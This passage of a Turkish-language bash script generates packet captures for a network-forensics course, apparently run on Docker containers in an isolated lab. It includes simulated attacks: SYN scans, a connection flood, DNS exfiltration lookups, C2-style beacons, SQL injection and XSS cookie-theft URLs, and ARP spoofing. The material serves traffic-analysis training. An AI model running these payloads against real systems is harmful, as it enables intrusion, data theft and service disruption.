    docker exec shark-tank-attacker curl -s -u "${FTP_USER}:${FTP_PASS}" ftp://172.50.2.15/ > /dev/null 2>&1 || true

    echo "  [3.6/7] Attacker: DNS exfiltration..."
    docker exec shark-tank-attacker dig @172.50.2.11 "c2F1c2FnZS1kZW5lbWUtb3J0YWxhLWthbHljaS1iaXQtZGF0YQ.exfil.shark-tank.local" > /dev/null 2>&1 || true
    docker exec shark-tank-attacker dig @172.50.2.11 "c2lyaS1iaWxpci1maWxhbi1lbWFuaWV0LWRhaGEtdHVrZW4.exfil.shark-tank.local" > /dev/null 2>&1 || true

    echo "  [4/7] C2 beaconing (düzenli aralıklı callback)..."
    for i in $(seq 1 6); do
        docker exec shark-tank-attacker curl -s -A "Mozilla/5.0 (Beacon)" "http://172.50.2.10/api/data?sid=$i" > /dev/null 2>&1 || true
        sleep 2
    done

    echo "  [5/7] ICMP (reconnaissance)..."
    docker exec shark-tank-client ping -c 2 172.50.2.10 > /dev/null
    docker exec shark-tank-client ping -c 2 172.50.2.14 > /dev/null
    sleep 1

    echo "  [6/7] Attacker: SYN scan (tüm servisler)..."
    docker exec shark-tank-attacker nmap -sS -p 21,22,25,53,80,443,8080,3306,5432 172.50.2.10 > /dev/null 2>&1 || true
    docker exec shark-tank-attacker nmap -sS -p 21,22,25,53,80,443,8080 172.50.2.13 > /dev/null 2>&1 || true
    docker exec shark-tank-attacker nmap -sS -p 21,22,25,53,80,443,8080 172.50.2.15 > /dev/null 2>&1 || true
    sleep 2

    echo "  [7/7] Attacker: SYN flood (web sunucuya)..."
    docker exec shark-tank-attacker bash -c 'for i in $(seq 1 30); do echo "SYN" | nc -w 0.1 172.50.2.10 80 2>/dev/null & done; wait' 2>/dev/null || true
    sleep 1

    echo "  Attacker: Şüpheli HTTP istekleri..."
    docker exec shark-tank-attacker curl -s "http://172.50.2.10/api/data?id=1'+UNION+SELECT+*+FROM+users--" > /dev/null 2>&1 || true
    docker exec shark-tank-attacker curl -s "http://172.50.2.10/api/data?q=<script>document.cookie</script>" > /dev/null 2>&1 || true
    docker exec shark-tank-attacker curl -s -A "Sqlmap/1.5" http://172.50.2.10/ > /dev/null 2>&1 || true
    sleep 1

    stop_capture
    merge_attacker_pcap "module-28-forensics"
    echo "  Pcap: shared/pcaps/module-28-forensics.pcap"
    echo ""
    echo "=== Forensics Soruları ==="
    echo "  1. Admin kullanıcısının şifresi nedir?"
    echo "  2. Employee kullanıcısının şifresi nedir?"
    echo "  3. Attacker hangi IP'lerden port scan yaptı?"
    echo "  4. SYN flood saldırısı kaç paketten oluşuyor?"
    echo "  5. SQL injection girişimi hangi URL'de?"
    echo "  6. XSS girişimi hangi URL'de?"
    echo "  7. Şüpheli User-Agent hangisi?"
    echo "  8. C2 benzeri düzenli bağlantı kaç kez tekrarlandı?"
    echo "  9. FTP ile hangi dosya transfer edildi?"
    echo "  10. Toplam kaç farklı protokol görüldü?"
}

generate_mixed() {
    echo ""
    echo "=== KARIŞIK Trafik (Sınav Pratiği) ==="
    start_capture "module-27-exam-practice"

    echo "  [1/7] HTTP istekleri..."
    docker exec shark-tank-client curl -s http://172.50.2.10/ > /dev/null
    docker exec shark-tank-client curl -s http://172.50.2.10/api/data > /dev/null
    docker exec shark-tank-client curl -s -X POST -d "username=${HTTP_ADMIN_USER}&password=${HTTP_ADMIN_PASS}" http://172.50.2.10/auth > /dev/null
    sleep 1

    echo "  [2/7] DNS sorguları..."
    docker exec shark-tank-client dig @172.50.2.11 web.shark-tank.local > /dev/null
    docker exec shark-tank-client dig @172.50.2.11 secure.shark-tank.local > /dev/null
    docker exec shark-tank-client dig @172.50.2.11 google.com > /dev/null
    docker exec shark-tank-client dig @172.50.2.11 nonexistent.shark-tank.local > /dev/null
    sleep 0.5

    echo "  [2b/7] Resolver -> indirme zinciri (dig hemen ardından ZIP download)..."
    docker exec shark-tank-client dig @172.50.2.11 web.shark-tank.local > /dev/null
    sleep 0.2
    docker exec shark-tank-client curl -s -H "Host: web.shark-tank.local" -o /tmp/batch-report.zip http://172.50.2.10/downloads/batch-report.zip
    docker exec shark-tank-client sha256sum /tmp/batch-report.zip 2>/dev/null || true
    sleep 0.5

    echo "  [3/7] HTTPS istekleri..."
    docker exec shark-tank-client curl -sk https://172.50.2.13/secure-data > /dev/null
    sleep 1

    echo "  [4/7] ICMP..."
    docker exec shark-tank-client ping -c 3 172.50.2.14 > /dev/null
    sleep 1

    echo "  [5/7] TCP echo..."
    docker exec shark-tank-client bash -c 'echo "test" | nc -w 1 172.50.2.12 8080'
    sleep 1

    echo "  [6/7] FTP..."
    wait_for_service 172.50.2.15 21 || true
    docker exec shark-tank-client curl -s -u "${FTP_USER}:${FTP_PASS}" ftp://172.50.2.15/ > /dev/null 2>&1 || true
    sleep 1

    echo "  [7/8] Attacker: port scan + SYN flood..."
    docker exec shark-tank-attacker nmap -sS -p 21,22,25,80,443,8080,3306 172.50.2.10 > /dev/null 2>&1 || true
    docker exec shark-tank-attacker nmap -sT -p 80,443 172.50.2.13 > /dev/null 2>&1 || true
    docker exec shark-tank-attacker bash -c 'for i in $(seq 1 20); do echo "SYN" | nc -w 0.1 172.50.2.10 80 2>/dev/null & done; wait' 2>/dev/null || true
    sleep 1

    echo "  [8/8] C2 beaconing (düzenli aralıklı callback)..."
    for i in $(seq 1 5); do
        docker exec shark-tank-attacker curl -s -A "Mozilla/5.0 (Beacon)" "http://172.50.2.10/api/data?sid=$i" > /dev/null 2>&1 || true
        sleep 2
    done

    stop_capture
    merge_attacker_pcap "module-27-exam-practice"
    echo "  Pcap: shared/pcaps/module-27-exam-practice.pcap"
    echo ""
    echo "=== Sınav Soruları ==="
    echo "  1. Kaç farklı protokol görüyorsun?"
    echo "  2. Admin kullanıcısının şifresi nedir?"
    echo "  3. Port scan hangi IP'den geldi?"
    echo "  4. DNS ile hangi domainler sorgulandı?"
    echo "  5. TLS handshake'de hangi cipher suite seçildi?"
    echo "  6. SYN flood saldırısı kaç paket içeriyor?"
    echo "  7. FTP ile gönderilen kullanıcı adı ve şifre nedir?"
    echo "  8. Hangi DNS sorgusu NXDOMAIN hatası aldi?"
}

generate_dhcp() {
    echo ""
    echo "=== DHCP Trafiği Üretiliyor ==="
    if ! docker ps --format '{{.Names}}' | grep -q 'shark-tank-dhcp-client'; then
        echo "  [HATA] DHCP container'ları çalışmıyor. make start çalıştırın."
        return 1
    fi

    echo "  Capture başlatılıyor..."
    docker exec -d shark-tank-dhcp-client tcpdump -i eth0 -w "/pcaps/module-04-dhcp.pcap" >/dev/null 2>&1 || true
    sleep 1

    echo "  DHCP isteği gönderiliyor (udhcpc)..."
    docker exec shark-tank-dhcp-client udhcpc -i eth0 -n 2>/dev/null || true
    sleep 2

    echo "  İkinci DHCP isteği (renew simülasyonu)..."
    docker exec shark-tank-dhcp-client udhcpc -i eth0 -n -R 2>/dev/null || true
    sleep 1

    echo "  Capture durduruluyor..."
    docker exec shark-tank-dhcp-client pkill tcpdump 2>/dev/null || true
    sleep 1

    docker cp "shark-tank-dhcp-client:/pcaps/module-04-dhcp.pcap" "${PROJECT_DIR}/shared/pcaps/module-04-dhcp.pcap" 2>/dev/null || true

    echo "  Pcap: shared/pcaps/module-04-dhcp.pcap"
}

generate_arp() {
    echo ""
    echo "=== ARP Trafiği Üretiliyor ==="
    start_capture "module-03-arp"

    echo "  ARP cache temizleniyor..."
    docker exec shark-tank-client ip neigh flush dev eth0 2>/dev/null || true
    docker exec shark-tank-attacker ip neigh flush dev eth0 2>/dev/null || true
    sleep 0.5

    echo "  ARP sorguları (ping ile tetiklenir)..."
    docker exec shark-tank-client ip neigh flush dev eth0 2>/dev/null || true
    docker exec shark-tank-client ping -c 2 172.50.2.10 > /dev/null
    sleep 0.5
    docker exec shark-tank-client ip neigh flush dev eth0 2>/dev/null || true
    docker exec shark-tank-client ping -c 2 172.50.2.14 > /dev/null
    sleep 0.5

    echo "  Attacker: ARP host keşfi (nmap -sn sweep)..."
    docker exec shark-tank-attacker ip neigh flush dev eth0 2>/dev/null || true
    docker exec shark-tank-attacker nmap -sn 172.50.2.10-20 2>/dev/null | grep -c "Host is up" || true
    sleep 1

    echo "  ARP spoofing simülasyonu (attacker aynı IP'ye cevap veriyor)..."
    docker exec shark-tank-client ip neigh flush dev eth0 2>/dev/null || true
    docker exec shark-tank-attacker bash -c 'arping -c 3 -S 172.50.2.10 172.50.2.100 2>/dev/null || true'
    sleep 1

    echo "  Gratuitous ARP..."
    docker exec shark-tank-client bash -c 'arping -c 3 -A -I eth0 172.50.2.100 2>/dev/null || true'
    sleep 0.5

    stop_capture
    merge_attacker_pcap "module-03-arp"
    echo "  Pcap: shared/pcaps/module-03-arp.pcap"
}

generate_basics() {
    echo ""
    echo "=== Temel Trafik Üretiliyor ==="
    start_capture "module-01-basics"

    echo "  HTTP istek..."
    docker exec shark-tank-client curl -s http://172.50.2.10/ > /dev/null
    sleep 0.3

    echo "  DNS sorgu..."
    docker exec shark-tank-client dig @172.50.2.11 web.shark-tank.local > /dev/null
    sleep 0.3

    echo "  ICMP ping..."
    docker exec shark-tank-client ping -c 3 172.50.2.14 > /dev/null
    sleep 0.3

    echo "  TCP echo..."
    docker exec shark-tank-client bash -c 'echo "Merhaba" | nc -w 2 172.50.2.12 8080'
    sleep 0.3

    stop_capture
    echo "  Pcap: shared/pcaps/module-01-basics.pcap"
}

generate_udp() {
    echo ""
    echo "=== UDP Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.17 9090 udp
    start_capture "module-10-udp"

    echo "  UDP echo server'a mesaj gönderiliyor..."
    docker exec shark-tank-client bash -c 'echo "UDP Test Mesajı" | nc -u -w 2 172.50.2.17 9090'
    sleep 0.5

    echo "  Birden fazla UDP mesaj..."
    docker exec shark-tank-client bash -c 'for i in 1 2 3 4 5; do echo "UDP Paket $i" | nc -u -w 1 172.50.2.17 9090; sleep 0.2; done'
    sleep 0.5

    echo "  DNS over UDP (zaten var ama yakalanıyor)..."
    docker exec shark-tank-client dig @172.50.2.11 web.shark-tank.local > /dev/null
    sleep 0.3

    echo "  UDP kapalı port testi..."
    docker exec shark-tank-client bash -c 'echo "test" | nc -u -w 1 172.50.2.17 9999 2>/dev/null || true'
    sleep 0.5

    stop_capture
    echo "  Pcap: shared/pcaps/module-10-udp.pcap"
}

generate_ipv6() {
    echo ""
    echo "=== IPv6 Trafiği Üretiliyor ==="
    start_capture "module-07-ipv6"

    echo "  IPv6 adres gösterimi..."
    docker exec shark-tank-client ip -6 addr show eth0 2>/dev/null || true
    sleep 0.3

    echo "  ICMPv6 Echo (ping6) ..."
    docker exec shark-tank-client ping6 -c 3 fd00:2::14 2>/dev/null || true
    sleep 1

    echo "  IPv6 Fragment Extension Header (büyük ping)..."
    docker exec shark-tank-client ping6 -c 2 -s 4000 fd00:2::14 2>/dev/null || true
    sleep 0.5

    echo "  IPv6 traceroute..."
    docker exec shark-tank-client traceroute6 fd00:2::14 2>/dev/null || true
    sleep 1

    echo "  AAAA DNS kaydı sorgusu..."
    docker exec shark-tank-client dig @172.50.2.11 web.shark-tank.local AAAA > /dev/null 2>&1 || true
    sleep 0.3

    echo "  Router Advertisement (ICMPv6 Type 134)..."
    docker exec shark-tank-icmp-target apk add python3 > /dev/null 2>&1 || true
    docker exec shark-tank-icmp-target python3 -c "
import socket, struct
s = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
ra = struct.pack('!BBH BBH II', 134, 0, 0, 64, 0, 1800, 0, 0)
prefix = socket.inet_pton(socket.AF_INET6, 'fd00:2::')
opt = struct.pack('!BBBB II', 3, 4, 64, 0xC0, 300, 120) + b'\x00'*4 + prefix
s.sendto(ra + opt, ('ff02::1', 0, 0, 0))
" 2>/dev/null || true
    sleep 0.5

    stop_capture
    echo "  Pcap: shared/pcaps/module-07-ipv6.pcap"
}

generate_fragmentation() {
    echo ""
    echo "=== IP Fragmentation Trafiği Üretiliyor ==="
    start_capture "module-06-fragmentation"

    echo "  Büyük ping (fragmentation tetikleme, MTU aşımı)..."
    docker exec shark-tank-client ping -c 2 -s 3000 172.50.2.14 2>/dev/null || true
    sleep 0.5

    echo "  Daha büyük ping..."
    docker exec shark-tank-client ping -c 2 -s 5000 172.50.2.14 2>/dev/null || true
    sleep 0.5

    echo "  Normal ping (MTU altı, fragment yok)..."
    docker exec shark-tank-client ping -c 2 -s 1000 172.50.2.14 2>/dev/null || true
    sleep 0.5

    echo "  DF flag set (fragmentation forbidden)..."
    docker exec shark-tank-client ping -c 2 -s 3000 -M do 172.50.2.14 2>/dev/null || true
    sleep 0.5

    echo "  UDP büyük paket (fragmentation)..."
    docker exec shark-tank-client bash -c 'python3 -c "print(\"X\"*4000)" 2>/dev/null | nc -u -w 2 172.50.2.17 9090'
    sleep 0.5

    echo "  Fragment overlap (teardrop tarzi: ofsetler cakisiyor)..."
    # Not: Docker bridge netfilter MF bayrakli raw paketleri dusurdugu icin
    # overlap zinciri hostta pcap olarak uretilip zaman sirasiyla birlestirilir.
    ATTACKER_MAC=$(docker exec shark-tank-attacker cat /sys/class/net/eth0/address 2>/dev/null | tr -d '\r\n')
    CLIENT_MAC=$(docker exec shark-tank-client cat /sys/class/net/eth0/address 2>/dev/null | tr -d '\r\n')
    if [ -n "${ATTACKER_MAC}" ] && [ -n "${CLIENT_MAC}" ]; then
        python3 "${PROJECT_DIR}/shared/tools/gen-overlap-pcap.py" \
            /tmp/module-06-overlap.pcap "${ATTACKER_MAC}" "${CLIENT_MAC}" >/dev/null 2>&1 || true
    fi
    sleep 0.5

    stop_capture

    # Overlap pcap'ini zaman sirasiyla birlestir
    if [ -f /tmp/module-06-overlap.pcap ]; then
        CLIENT_PCAP="${PROJECT_DIR}/shared/pcaps/module-06-fragmentation.pcap" \
        ATTACKER_PCAP="/tmp/module-06-overlap.pcap" python3 -c "
import struct, os
def read_pcap(f):
    pkts = []
    hdr = f.read(24)
    if len(hdr) < 24: return hdr, []
    while True:
        ph = f.read(16)
        if len(ph) < 16: break
        ts_sec, ts_usec, incl_len, _ = struct.unpack('<IIII', ph)
        data = f.read(incl_len)
        if len(data) < incl_len: break
        pkts.append((ts_sec, ts_usec, data))
    return hdr, pkts
with open(os.environ['CLIENT_PCAP'], 'rb') as f1:
    ghdr, pkts1 = read_pcap(f1)
with open(os.environ['ATTACKER_PCAP'], 'rb') as f2:
    _, pkts2 = read_pcap(f2)
all_pkts = sorted(pkts1 + pkts2, key=lambda x: (x[0], x[1]))
with open(os.environ['CLIENT_PCAP'], 'wb') as out:
    out.write(ghdr)
    for ts_sec, ts_usec, data in all_pkts:
        out.write(struct.pack('<IIII', ts_sec, ts_usec, len(data), len(data)))
        out.write(data)
" 2>/dev/null || true
        rm -f /tmp/module-06-overlap.pcap
        echo "  Overlap zinciri pcap'e birlestirildi (ident=0x7771)"
    fi

    echo "  Pcap: shared/pcaps/module-06-fragmentation.pcap"
}

generate_email() {
    echo ""
    echo "=== Email Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.16 1025
    wait_for_service 172.50.2.18 110
    start_capture "module-15-email"

    echo "  1/4 SMTP email gönderimi..."
    docker exec -e IMAP_USER=kullanici -e IMAP_PASS=secret123 shark-tank-client bash -c '
    (
    echo "EHLO shark-tank-client"
    sleep 0.5
    echo "MAIL FROM:<${IMAP_USER}@shark-tank.local>"
    sleep 0.3
    echo "RCPT TO:<destek@shark-tank.local>"
    sleep 0.3
    echo "DATA"
    sleep 0.3
    echo "From: ${IMAP_USER}@shark-tank.local"
    echo "To: destek@shark-tank.local"
    echo "Subject: Aylık Değerlendirme Raporu"
    echo ""
    echo "Aylik network degerlendirme raporu ektedir."
    echo "Detaylar icin guvenli kanal kullanin."
    echo "."
    sleep 0.3
    echo "QUIT"
    ) | nc -w 5 172.50.2.16 1025' 2>/dev/null || true
    sleep 1

    echo "  2/4 SMTP AUTH LOGIN (base64 auth) via IMAP submission..."
    docker exec -e IMAP_USER=kullanici -e IMAP_PASS=secret123 shark-tank-client bash -c '
    (
    sleep 0.3
    echo "EHLO shark-tank-client"
    sleep 0.3
    echo "AUTH LOGIN"
    sleep 0.3
    echo -n "${IMAP_USER}" | base64
    sleep 0.3
    echo -n "${IMAP_PASS}" | base64
    sleep 0.3
    echo "MAIL FROM:<${IMAP_USER}@shark-tank.local>"
    sleep 0.3
    echo "RCPT TO:<destek@shark-tank.local>"
    sleep 0.3
    echo "DATA"
    sleep 0.3
    echo "From: ${IMAP_USER}@shark-tank.local"
    echo "To: destek@shark-tank.local"
    echo "Subject: Auth Test"
    echo ""
    echo "Bu email AUTH LOGIN ile gonderildi."
    echo "."
    sleep 0.3
    echo "QUIT"
    ) | nc -w 5 172.50.2.18 587' 2>/dev/null || true
    sleep 1

    echo "  3/4 POP3 oturumu..."
    docker exec shark-tank-client bash -c '
    (
    sleep 0.3
    echo "USER kullanici"
    sleep 0.3
    echo "PASS secret123"
    sleep 0.3
    echo "STAT"
    sleep 0.3
    echo "LIST"
    sleep 0.3
    echo "RETR 1"
    sleep 0.3
    echo "QUIT"
    ) | nc -w 5 172.50.2.18 110' 2>/dev/null || true
    sleep 1

    echo "  3b/4 SMTP attachment'lı email (MIME + base64 ek)..."
    docker exec shark-tank-client bash -c '
    ATT=$(python3 -c "import base64; print(base64.b64encode(bytes(range(1,129))*4).decode())")
    (
    sleep 0.3
    echo "EHLO shark-tank-client"
    sleep 0.3
    echo "MAIL FROM:<phantom@shark-tank.local>"
    sleep 0.3
    echo "RCPT TO:<target@shark-tank.local>"
    sleep 0.3
    echo "DATA"
    sleep 0.3
    echo "From: phantom@shark-tank.local"
    echo "To: target@shark-tank.local"
    echo "Subject: Fatura ve rapor ektedir (acil)"
    echo "MIME-Version: 1.0"
    echo "Content-Type: multipart/mixed; boundary=\"ST-BOUNDARY-42\""
    echo ""
    echo "--ST-BOUNDARY-42"
    echo "Content-Type: text/plain; charset=UTF-8"
    echo ""
    echo "Ekte imzali fatura ve aylik rapor yer almaktadir."
    echo ""
    echo "--ST-BOUNDARY-42"
    echo "Content-Type: application/octet-stream; name=\"gizli-ek.bin\""
    echo "Content-Transfer-Encoding: base64"
    echo "Content-Disposition: attachment; filename=\"gizli-ek.bin\""
    echo ""
    echo "$ATT" | fold -w 76
    echo ""
    echo "--ST-BOUNDARY-42--"
    echo "."
    sleep 0.3
    echo "QUIT"
    ) | nc -w 6 172.50.2.16 1025' 2>/dev/null || true
    sleep 1

    echo "  4/4 IMAP oturumu..."
    docker exec shark-tank-client bash -c '
    (
    sleep 0.3
    echo "a1 LOGIN kullanici secret123"
    sleep 0.3
    echo "a2 SELECT INBOX"
    sleep 0.3
    echo "a3 FETCH 1 (BODY[])"
    sleep 0.3
    echo "a4 FETCH 2 (BODY[])"
    sleep 0.5
    echo "a5 LOGOUT"
    ) | nc -w 6 172.50.2.18 143' 2>/dev/null || true
    sleep 1

    stop_capture
    echo "  Pcap: shared/pcaps/module-15-email.pcap"
}

generate_advanced_tcp() {
    echo ""
    echo "=== İleri Düzey TCP Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.12 8080

    echo "  Ağ gecikmesi/kaybı etkinleştiriliyor (retransmission/SACK/dup ACK için)..."
    docker exec shark-tank-tcp-echo apk add iproute2 > /dev/null 2>&1 || true
    docker exec shark-tank-tcp-echo tc qdisc del dev eth0 root 2>/dev/null || true
    docker exec shark-tank-tcp-echo tc qdisc add dev eth0 root netem delay 200ms loss 25% 2>/dev/null || true

    start_capture "module-11-advanced-tcp"

    echo "  Büyük veri transferi (retransmission + SACK + zero window tetikleme)..."
    docker exec shark-tank-client bash -c 'python3 -c "print(\"D\"*80000)" 2>/dev/null | nc -w 5 172.50.2.12 8080' 2>/dev/null || true
    sleep 1

    echo "  Zero window tetikleme (yavaş okuyucu)..."
    docker exec shark-tank-client bash -c 'python3 -c "
import socket, time
s = socket.socket()
s.connect((\"172.50.2.12\", 8080))
s.send(b\"X\"*100000)
time.sleep(1)
s.close()
" 2>/dev/null' 2>/dev/null || true
    sleep 1

    echo "  TCP keep-alive paketleri (SO_KEEPALIVE)..."
    docker exec shark-tank-client bash -c 'python3 -c "
import socket, time
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 1)
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 1)
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
s.connect((\"172.50.2.12\", 8080))
s.send(b\"ka-test\")
time.sleep(5)
s.close()
" 2>/dev/null' 2>/dev/null || true
    sleep 1

    echo "  Çoklu kısa bağlantılar (window scaling gözlemi)..."
    docker exec shark-tank-client bash -c 'for i in 1 2 3; do echo "quick-$i" | nc -w 1 172.50.2.12 8080; done'
    sleep 1

    echo "  Attacker: agresif bağlantılar..."
    docker exec shark-tank-attacker bash -c 'for i in $(seq 1 10); do echo "flood-$i" | nc -w 0.1 172.50.2.12 8080 2>/dev/null & done; wait' 2>/dev/null || true
    sleep 2

    stop_capture

    echo "  Ağ gecikmesi/kaybı kaldırılıyor..."
    docker exec shark-tank-tcp-echo tc qdisc del dev eth0 root 2>/dev/null || true

    merge_attacker_pcap "module-11-advanced-tcp"
    echo "  Pcap: shared/pcaps/module-11-advanced-tcp.pcap"
}

generate_tcp_sequence() {
    echo ""
    echo "=== TCP Dizi Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.12 8080

    echo "  Ağ gecikmesi/kaybı etkinleştiriliyor (retransmission/dup ACK için)..."
    docker exec shark-tank-tcp-echo apk add iproute2 > /dev/null 2>&1 || true
    docker exec shark-tank-tcp-echo tc qdisc del dev eth0 root 2>/dev/null || true
    docker exec shark-tank-tcp-echo tc qdisc add dev eth0 root netem delay 200ms loss 25% 2>/dev/null || true

    start_capture "module-09-tcp-sequence"

    echo "  TCP echo veri gönderimi (retransmission için uygun)..."
    docker exec shark-tank-client bash -c 'python3 -c "print(\"X\"*8000)" 2>/dev/null | nc -w 3 172.50.2.12 8080' 2>/dev/null || true
    sleep 0.5

    echo "  Flood pattern (dup ACK/out-of-order tetikleme)..."
    docker exec shark-tank-attacker bash -c 'for i in $(seq 1 15); do echo "flood-$i" | nc -w 0.1 172.50.2.12 8080 2>/dev/null & done; wait' 2>/dev/null || true
    sleep 1

    echo "  Büyük HTTP (TCP grafik için)..."
    docker exec shark-tank-client curl -s http://172.50.2.10/large > /dev/null 2>&1 || true
    sleep 0.5

    echo "  Port scan + TCP veri (karışık dizi)..."
    docker exec shark-tank-attacker nmap -sS -p 1-1000 172.50.2.12 > /dev/null 2>&1 || true
    sleep 1

    stop_capture

    echo "  Ağ gecikmesi/kaybı kaldırılıyor..."
    docker exec shark-tank-tcp-echo tc qdisc del dev eth0 root 2>/dev/null || true

    merge_attacker_pcap "module-09-tcp-sequence"
    echo "  Pcap: shared/pcaps/module-09-tcp-sequence.pcap"
}

generate_tcp_graph() {
    echo ""
    echo "=== TCP Grafik Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.12 8080

    echo "  Hafif ağ gecikmesi/kaybı (grafik analizi için)..."
    docker exec shark-tank-tcp-echo apk add iproute2 > /dev/null 2>&1 || true
    docker exec shark-tank-tcp-echo tc qdisc del dev eth0 root 2>/dev/null || true
    docker exec shark-tank-tcp-echo tc qdisc add dev eth0 root netem delay 150ms loss 20% 2>/dev/null || true

    start_capture "module-22-tcp-graph"

    echo "  Büyük veri transferi (IO Graph için)..."
    docker exec shark-tank-client bash -c 'python3 -c "print(\"G\"*30000)" 2>/dev/null | nc -w 5 172.50.2.12 8080' 2>/dev/null || true
    sleep 1

    echo "  HTTP büyük response..."
    docker exec shark-tank-client curl -s http://172.50.2.10/large > /dev/null 2>&1 || true
    sleep 0.5

    echo "  Arka arkaya çoklu istek (throughput grafiği)..."
    for i in $(seq 1 5); do
        docker exec shark-tank-client curl -s http://172.50.2.10/api/data > /dev/null 2>&1 || true
        sleep 0.2
    done

    echo "  TCP echo çoklu bağlantı..."
    docker exec shark-tank-client bash -c 'for i in 1 2 3; do echo "test-$i" | nc -w 1 172.50.2.12 8080; done'
    sleep 0.5

    stop_capture

    echo "  Ağ gecikmesi/kaybı kaldırılıyor..."
    docker exec shark-tank-tcp-echo tc qdisc del dev eth0 root 2>/dev/null || true

    echo "  Pcap: shared/pcaps/module-22-tcp-graph.pcap"
}

generate_performance() {
    echo ""
    echo "=== Performans Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.12 8080

    echo "  Ağ gecikmesi/kaybı etkinleştiriliyor (yüksek RTT/retransmission için)..."
    docker exec shark-tank-tcp-echo apk add iproute2 > /dev/null 2>&1 || true
    docker exec shark-tank-tcp-echo tc qdisc del dev eth0 root 2>/dev/null || true
    docker exec shark-tank-tcp-echo tc qdisc add dev eth0 root netem delay 300ms loss 25% 2>/dev/null || true

    start_capture "module-23-performance"

    echo "  Normal trafik (baseline)..."
    docker exec shark-tank-client bash -c 'echo "normal" | nc -w 2 172.50.2.12 8080' 2>/dev/null || true
    sleep 0.5

    echo "  Büyük veri (window scaling + retransmission + dup ACK)..."
    docker exec shark-tank-client bash -c 'python3 -c "print(\"P\"*80000)" 2>/dev/null | nc -w 5 172.50.2.12 8080' 2>/dev/null || true
    sleep 1

    echo "  Zero window tetikleme (yavaş okuyucu)..."
    docker exec shark-tank-client bash -c 'python3 -c "
import socket, time
s = socket.socket()
s.connect((\"172.50.2.12\", 8080))
s.send(b\"X\"*100000)
time.sleep(1)
s.close()
" 2>/dev/null' 2>/dev/null || true
    sleep 1

    echo "  HTTP yavaş response simülasyonu..."
    docker exec shark-tank-client curl -s --connect-timeout 5 http://172.50.2.10/large > /dev/null 2>&1 || true
    sleep 0.5

    echo "  Çoklu hızlı bağlantı (port exhaustion sim)..."
    docker exec shark-tank-attacker bash -c 'for i in $(seq 1 25); do echo "burst-$i" | nc -w 0.5 172.50.2.12 8080 2>/dev/null & done; wait' 2>/dev/null || true
    sleep 2

    stop_capture

    echo "  Ağ gecikmesi/kaybı kaldırılıyor..."
    docker exec shark-tank-tcp-echo tc qdisc del dev eth0 root 2>/dev/null || true

    merge_attacker_pcap "module-23-performance"
    echo "  Pcap: shared/pcaps/module-23-performance.pcap"
}

generate_baseline() {
    echo ""
    echo "=== Baseline Trafiği Üretiliyor ==="
    start_capture "module-26-baseline"

    echo "  Normal HTTP..."
    docker exec shark-tank-client curl -s http://172.50.2.10/ > /dev/null
    docker exec shark-tank-client curl -s http://172.50.2.10/api/data > /dev/null
    sleep 0.5

    echo "  Normal DNS..."
    docker exec shark-tank-client dig @172.50.2.11 web.shark-tank.local +short > /dev/null
    docker exec shark-tank-client dig @172.50.2.11 google.com +short > /dev/null
    sleep 0.5

    echo "  Normal ICMP..."
    docker exec shark-tank-client ping -c 3 172.50.2.14 > /dev/null
    sleep 0.5

    echo "  Normal TCP echo..."
    docker exec shark-tank-client bash -c 'echo "baseline" | nc -w 2 172.50.2.12 8080'
    sleep 0.5

    echo "  Normal HTTPS..."
    docker exec shark-tank-client curl -sk https://172.50.2.13/ > /dev/null
    sleep 0.5

    echo "  Anomali: port scan + SYN flood..."
    docker exec shark-tank-attacker nmap -sS -p 21,22,80,443 172.50.2.10 > /dev/null 2>&1 || true
    docker exec shark-tank-attacker bash -c 'for i in $(seq 1 15); do echo "flood" | nc -w 0.1 172.50.2.10 80 2>/dev/null & done; wait' 2>/dev/null || true
    sleep 1

    stop_capture
    merge_attacker_pcap "module-26-baseline"
    echo "  Pcap: shared/pcaps/module-26-baseline.pcap"
    echo "  Not: module-27-exam-practice.pcap ile karşılaştırmalı analiz için kullanılır."
}

case "$MODULE" in
    all)
        generate_basics    || echo "  [UYARI] basics başarısız, devam ediliyor"
        generate_arp       || echo "  [UYARI] arp başarısız, devam ediliyor"
        generate_dhcp      || echo "  [UYARI] dhcp başarısız, devam ediliyor"
        generate_icmp      || echo "  [UYARI] icmp başarısız, devam ediliyor"
        generate_fragmentation  || echo "  [UYARI] fragmentation başarısız, devam ediliyor"
        generate_ipv6      || echo "  [UYARI] ipv6 başarısız, devam ediliyor"
        generate_tcp       || echo "  [UYARI] tcp başarısız, devam ediliyor"
        generate_tcp_sequence || echo "  [UYARI] tcp-sequence başarısız, devam ediliyor"
        generate_udp       || echo "  [UYARI] udp başarısız, devam ediliyor"
        generate_advanced_tcp || echo "  [UYARI] advanced-tcp başarısız, devam ediliyor"
        generate_dns       || echo "  [UYARI] dns başarısız, devam ediliyor"
        generate_http      || echo "  [UYARI] http başarısız, devam ediliyor"
        generate_ftp       || echo "  [UYARI] ftp başarısız, devam ediliyor"
        generate_email     || echo "  [UYARI] email başarısız, devam ediliyor"
        generate_kerberos  || echo "  [UYARI] kerberos başarısız, devam ediliyor"
        generate_ldap      || echo "  [UYARI] ldap başarısız, devam ediliyor"
        generate_smb2      || echo "  [UYARI] smb2 başarısız, devam ediliyor"
        generate_tls       || echo "  [UYARI] tls başarısız, devam ediliyor"
        generate_tcp_graph  || echo "  [UYARI] tcp-graph başarısız, devam ediliyor"
        generate_performance || echo "  [UYARI] performance başarısız, devam ediliyor"
        generate_voip       || echo "  [UYARI] voip başarısız, devam ediliyor"
        generate_baseline   || echo "  [UYARI] baseline başarısız, devam ediliyor"
        generate_mixed     || echo "  [UYARI] mixed başarısız, devam ediliyor"
        generate_forensics || echo "  [UYARI] forensics başarısız, devam ediliyor"
        ;;
    kerberos)        generate_kerberos ;;
    ldap)            generate_ldap ;;
    smb2)            generate_smb2 ;;
    basics)          generate_basics ;;
    arp)             generate_arp ;;
    http)            generate_http ;;
    dns)             generate_dns ;;
    tcp)             generate_tcp ;;
